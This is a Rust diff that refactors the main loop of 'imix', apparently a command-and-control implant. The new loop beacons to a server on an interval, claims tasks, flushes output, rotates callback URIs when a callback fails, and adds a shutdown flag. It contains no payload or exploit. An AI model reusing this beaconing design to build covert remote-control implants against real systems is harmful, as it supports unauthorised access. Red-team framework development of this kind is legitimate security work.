@@ -1,66 +1,144 @@
-use clap::Command;
-use std::time::Duration;
+use anyhow::Result;
+use std::sync::Arc;
+use std::sync::atomic::{AtomicBool, Ordering};
+use std::time::{Duration, Instant};
 
-pub use crate::agent::Agent;
-pub use crate::install::install;
+use crate::agent::ImixAgent;
+use crate::task::TaskRegistry;
 use crate::version::VERSION;
-pub use pb::config::Config;
-
+use pb::config::Config;
 use transport::{ActiveTransport, Transport};
 
-const DEFAULT_RETRY_INTERVAL: u64 = 5;
+pub static SHUTDOWN: AtomicBool = AtomicBool::new(false);
 
-pub async fn handle_main() {
-    if let Some(("install", _)) = Command::new("imix")
-        .subcommand(Command::new("install").about("Install imix"))
-        .get_matches()
-        .subcommand()
-    {
-        install().await;
-        return;
-    }
+pub async fn run_agent() -> Result<()> {
+    init_logger();
 
-    loop {
-        let cfg = Config::default_with_imix_version(VERSION);
-        let retry_interval = cfg
-            .info
-            .as_ref()
-            .and_then(|beacon| beacon.available_transports.as_ref())
-            .and_then(|available| available.transports.get(available.active_index as usize))
-            .map(|transport| transport.interval)
-            .unwrap_or(DEFAULT_RETRY_INTERVAL);
+    // Load config / defaults
+    let config = Config::default_with_imix_version(VERSION);
+    #[cfg(debug_assertions)]
+    log::info!("Loaded config: {config:#?}");
 
-        #[cfg(debug_assertions)]
-        log::info!("agent config initialized {:#?}", cfg.clone());
+    let run_once = config.run_once;
 
-        let run_once = cfg.run_once;
+    // Initial transport is just a placeholder, we create active ones in the loop
+    let transport = ActiveTransport::init();
 
-        match run(cfg).await {
-            Ok(_) => {}
-            Err(_err) => {
-                #[cfg(debug_assertions)]
-                log::error!("callback loop fatal: {_err}");
+    let handle = tokio::runtime::Handle::current();
+    let task_registry = Arc::new(TaskRegistry::new());
+    let agent = Arc::new(ImixAgent::new(
+        config,
+        transport,
+        handle,
+        task_registry.clone(),
+    ));
 
-                tokio::time::sleep(Duration::from_secs(retry_interval)).await;
-            }
-        }
+    // Track the last interval we slept for, as a fallback in case we fail to read the config
+    let mut last_interval = agent.get_callback_interval_u64().unwrap_or(5);
 
-        if run_once {
+    #[cfg(debug_assertions)]
+    log::info!("Agent initialized");
+
+    while !SHUTDOWN.load(Ordering::Relaxed) {
+        let start = Instant::now();
+        let agent_ref = agent.clone();
+        let registry_ref = task_registry.clone();
+
+        run_agent_cycle(agent_ref, registry_ref).await;
+
+        if SHUTDOWN.load(Ordering::Relaxed) || run_once {
             break;
         }
-    }
-}
 
-async fn run(cfg: Config) -> anyhow::Result<()> {
-    let mut agent = Agent::new(cfg, ActiveTransport::init())?;
-    agent.callback_loop().await?;
+        if let Ok(new_interval) = agent.get_callback_interval_u64() {
+            last_interval = new_interval;
+        }
+
+        if let Err(e) = sleep_until_next_cycle(&agent, start).await {
+            #[cfg(debug_assertions)]
+            log::error!(
+                "Failed to sleep, falling back to last interval {last_interval} sec: {e:#}"
+            );
+
+            // Prevent tight loop on config read failure
+            tokio::time::sleep(Duration::from_secs(last_interval)).await;
+        }
+    }
+
+    #[cfg(debug_assertions)]
+    log::info!("Agent shutting down");
+
     Ok(())
 }
 
-#[cfg(debug_assertions)]
-pub fn init_logging() {
-    pretty_env_logger::formatted_timed_builder()
-        .filter_level(log::LevelFilter::Info)
-        .parse_env("IMIX_LOG")
-        .init();
+pub fn init_logger() {
+    #[cfg(debug_assertions)]
+    {
+        use pretty_env_logger;
+        let _ = pretty_env_logger::formatted_timed_builder()
+            .filter_level(log::LevelFilter::Info)
+            .parse_env("IMIX_LOG")
+            .try_init();
+        log::info!("Starting imixv2 agent");
+    }
+}
+
+async fn run_agent_cycle(agent: Arc<ImixAgent<ActiveTransport>>, registry: Arc<TaskRegistry>) {
+    // Refresh IP
+    agent.refresh_ip().await;
+
+    // Create new active transport
+    let config = agent.get_transport_config().await;
+
+    let transport = match ActiveTransport::new(config) {
+        Ok(t) => t,
+        Err(_e) => {
+            #[cfg(debug_assertions)]
+            log::error!("Failed to create transport: {_e:#}");
+            agent.rotate_callback_uri().await;
+            return;
+        }
+    };
+
+    // Set transport
+    agent.update_transport(transport).await;
+
+    // Claim Tasks
+    process_tasks(&agent, &registry).await;
+
+    // Flush Outputs (send all buffered output)
+    agent.flush_outputs().await;
+
+    // Disconnect (drop transport)
+    agent.update_transport(ActiveTransport::init()).await;
+}
+
+async fn process_tasks(agent: &ImixAgent<ActiveTransport>, _registry: &TaskRegistry) {
+    match agent.process_job_request().await {
+        Ok(_) => {
+            #[cfg(debug_assertions)]
+            log::info!("Callback success");
+        }
+        Err(_e) => {
+            #[cfg(debug_assertions)]
+            log::error!("Callback failed: {_e:#}");
+            agent.rotate_callback_uri().await;
+        }
+    }
+}
+
+async fn sleep_until_next_cycle(agent: &ImixAgent<ActiveTransport>, start: Instant) -> Result<()> {
+    let interval = agent.get_callback_interval_u64()?;
+    let delay = match interval.checked_sub(start.elapsed().as_secs()) {
+        Some(secs) => Duration::from_secs(secs),
+        None => Duration::from_secs(0),
+    };
+    #[cfg(debug_assertions)]
+    log::info!(
+        "Callback complete (duration={}s, sleep={}s)",
+        start.elapsed().as_secs(),
+        delay.as_secs()
+    );
+    tokio::time::sleep(delay).await;
+    Ok(())
 }
